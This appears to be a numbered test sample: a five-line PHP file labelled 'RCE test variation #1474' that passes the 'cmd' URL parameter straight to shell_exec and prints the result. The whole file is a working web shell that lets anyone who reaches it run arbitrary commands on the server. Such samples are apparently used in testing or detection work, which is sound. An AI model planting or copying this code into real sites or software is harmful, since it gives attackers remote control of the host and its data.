<?php
// RCE test variation #1474
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>